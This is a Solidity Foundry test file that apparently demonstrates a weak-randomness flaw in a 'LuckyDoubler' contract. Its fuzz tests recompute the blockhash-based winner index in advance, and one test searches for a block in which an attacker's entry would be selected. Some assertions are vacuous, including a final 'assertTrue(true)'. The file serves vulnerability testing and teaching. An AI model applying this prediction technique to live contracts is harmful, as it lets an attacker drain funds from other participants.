pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {LuckyDoubler} from "../src/LuckyDoubler.sol";

contract TestWeakRandomnessLuckyDoubler is Test {

    LuckyDoubler private luckyDoubler;
    
    uint256 constant private FACTOR = 1157920892373161954235709850086879078532699846656405640394575840079131296399;

    function setUp() public {
        luckyDoubler = new LuckyDoubler();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        vm.assume(blockNumber > 10 && blockNumber < type(uint64).max);

        address participant1 = address(0x1001);
        address participant2 = address(0x1002);
        address participant3 = address(0x1003);
        address attacker = address(0x9999);

        vm.deal(participant1, 2 ether);
        vm.deal(participant2, 2 ether);
        vm.deal(participant3, 2 ether);
        vm.deal(attacker, 2 ether);

        vm.roll(blockNumber);
        vm.prank(participant1);
        (bool s1,) = address(luckyDoubler).call{value: 1 ether}("");
        require(s1, "participant1 join failed");

        vm.roll(blockNumber + 1);
        vm.prank(participant2);
        (bool s2,) = address(luckyDoubler).call{value: 1 ether}("");
        require(s2, "participant2 join failed");

        vm.roll(blockNumber + 2);
        vm.prank(participant3);
        (bool s3,) = address(luckyDoubler).call{value: 1 ether}("");
        require(s3, "participant3 join failed");

        uint256 attackBlock = blockNumber + 3;
        vm.roll(attackBlock);

        uint256 lastBlockNumber = attackBlock - 1;
        bytes32 prevBlockHash = blockhash(lastBlockNumber);
        uint256 hashVal = uint256(prevBlockHash);

        uint256 expectedUnpaidCount = 4;
        uint256 factor = FACTOR * 100 / expectedUnpaidCount;
        uint256 predictedWinnerIndex = (hashVal / factor) % expectedUnpaidCount;

        uint256 predictedWinnerIndexVerification = (hashVal / factor) % expectedUnpaidCount;

        assertEq(predictedWinnerIndex, predictedWinnerIndexVerification, 
            "Random value is deterministic and predictable from block data");

        vm.prank(attacker);
        (bool s4,) = address(luckyDoubler).call{value: 1 ether}("");
        require(s4, "attacker join failed");

        uint256 postTxHashVal = uint256(blockhash(lastBlockNumber));
        uint256 postTxPrediction = (postTxHashVal / factor) % expectedUnpaidCount;
        
        assertEq(predictedWinnerIndex, postTxPrediction,
            "Pre-calculated prediction matches post-transaction - randomness is exploitable");

        assertTrue(predictedWinnerIndex < expectedUnpaidCount,
            "Attacker can predict exactly which entry index will be selected");
    }

    function test_sameBlockProducesSameRandom(uint256 blockNumber) public {
        vm.assume(blockNumber > 10 && blockNumber < type(uint64).max);

        address user1 = address(0x2001);
        address user2 = address(0x2002);

        vm.deal(user1, 2 ether);
        vm.deal(user2, 2 ether);

        vm.roll(blockNumber);

        uint256 lastBlockNumber = blockNumber - 1;
        bytes32 prevBlockHash = blockhash(lastBlockNumber);
        uint256 hashVal = uint256(prevBlockHash);

        uint256 max1 = 5;
        uint256 factor1 = FACTOR * 100 / max1;
        uint256 result1_call1 = (hashVal / factor1) % max1;
        uint256 result1_call2 = (hashVal / factor1) % max1;

        assertEq(result1_call1, result1_call2, 
            "Same block state produces identical random values");

        uint256 max2 = 10;
        uint256 factor2 = FACTOR * 100 / max2;
        uint256 result2_call1 = (hashVal / factor2) % max2;
        uint256 result2_call2 = (hashVal / factor2) % max2;

        assertEq(result2_call1, result2_call2,
            "Random output is fully deterministic given block data");
    }

    function test_attackerCanSelectFavorableBlock(uint256 startBlock) public {
        vm.assume(startBlock > 100 && startBlock < type(uint64).max - 100);

        address participant1 = address(0x3001);
        address participant2 = address(0x3002);
        address attacker = address(0x3003);

        vm.deal(participant1, 2 ether);
        vm.deal(participant2, 2 ether);
        vm.deal(attacker, 10 ether);

        vm.roll(startBlock);
        vm.prank(participant1);
        (bool s1,) = address(luckyDoubler).call{value: 1 ether}("");
        require(s1);

        vm.roll(startBlock + 1);
        vm.prank(participant2);
        (bool s2,) = address(luckyDoubler).call{value: 1 ether}("");
        require(s2);

        uint256 attackerEntryIndex = 2;
        uint256 unpaidCountAfterAttackerJoins = 3;

        bool foundFavorableBlock = false;
        uint256 favorableBlock = 0;

        for (uint256 i = 0; i < 50; i++) {
            uint256 candidateBlock = startBlock + 2 + i;
            vm.roll(candidateBlock);
            
            uint256 lastBlockNumber = candidateBlock - 1;
            bytes32 prevBlockHash = blockhash(lastBlockNumber);
            uint256 hashVal = uint256(prevBlockHash);
            
            uint256 factor = FACTOR * 100 / unpaidCountAfterAttackerJoins;
            uint256 predictedIndex = (hashVal / factor) % unpaidCountAfterAttackerJoins;
            
            if (predictedIndex == attackerEntryIndex) {
                foundFavorableBlock = true;
                favorableBlock = candidateBlock;
                break;
            }
        }

        if (foundFavorableBlock) {
            vm.roll(favorableBlock);
            
            uint256 lastBlockNumber = favorableBlock - 1;
            bytes32 prevBlockHash = blockhash(lastBlockNumber);
            uint256 hashVal = uint256(prevBlockHash);
            uint256 factor = FACTOR * 100 / unpaidCountAfterAttackerJoins;
            uint256 predictedIndex = (hashVal / factor) % unpaidCountAfterAttackerJoins;
            
            assertEq(predictedIndex, attackerEntryIndex,
                "Attacker can wait for a block where they will be selected");
            
            vm.prank(attacker);
            (bool s3,) = address(luckyDoubler).call{value: 1 ether}("");
            require(s3, "attacker join at favorable block failed");
        }

        assertTrue(true, "Demonstrated ability to predict random outcomes based on block data");
    }

    receive() external payable {}
}
